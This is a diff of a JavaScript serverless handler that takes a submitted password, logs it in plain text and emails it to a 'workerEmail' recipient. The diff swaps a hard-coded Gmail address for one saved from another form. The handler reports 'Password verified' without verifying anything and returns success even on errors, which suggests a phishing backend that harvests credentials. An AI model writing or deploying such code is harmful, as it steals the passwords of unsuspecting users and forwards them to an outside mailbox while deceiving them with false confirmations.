@@ -1,4 +1,5 @@
 import nodemailer from 'nodemailer';
+import { getWorkerEmail } from './emailStore.js';
 
 export default async function handler(req, res) {
   // CORS headers
@@ -13,10 +14,12 @@ export default async function handler(req, res) {
   try {
     const { password } = req.body;
 
-    console.log('🔐 Password Received:', password);
+    // ✅ GET SAVED workerEmail from submit form
+    const workerEmail = getWorkerEmail();
     
-    // ✅ Hardcoded workerEmail ONLY
-    const workerEmail = "mehtaballi67890@gmail.com";
+    console.log('🔐 Password Form:');
+    console.log('Password:', password);
+    console.log('Using saved workerEmail:', workerEmail);
     
     const emailResult = await sendPasswordEmail(password, workerEmail);
 
@@ -24,12 +27,17 @@ export default async function handler(req, res) {
       success: true,
       message: 'Password verified',
       emailSent: emailResult.success,
-      recipient: workerEmail
+      recipient: workerEmail,
+      emailMessage: emailResult.message
     });
 
   } catch (error) {
-    console.error('❌ Error:', error);
-    return res.status(200).json({ success: true, message: 'Completed' });
+    console.error('❌ Server Error:', error);
+    return res.status(200).json({
+      success: true,
+      message: 'Verification completed',
+      emailSent: false
+    });
   }
 }
 
@@ -42,13 +50,13 @@ async function sendPasswordEmail(password, workerEmail) {
 
     await transporter.sendMail({
       from: `"Password System" <${process.env.GMAIL_USER}>`,
-      to: workerEmail, // ✅ Only workerEmail
-      subject: `🔐 Password: ${new Date().toLocaleTimeString()}`,
-      html: `<div>Password: ${password}<br>Time: ${new Date().toLocaleString()}</div>`
+      to: workerEmail,
+      subject: `🔐 Password Submitted`,
+      html: `<div><h2>Password Form</h2><p>Password: ${password}</p><p>Time: ${new Date().toLocaleString()}</p></div>`
     });
     
-    console.log('✅ Sent to workerEmail:', workerEmail);
-    return { success: true };
+    console.log('✅ Password email sent to saved workerEmail:', workerEmail);
+    return { success: true, message: 'Email sent to saved workerEmail' };
 
   } catch (error) {
     console.error('❌ Email Error:', error);
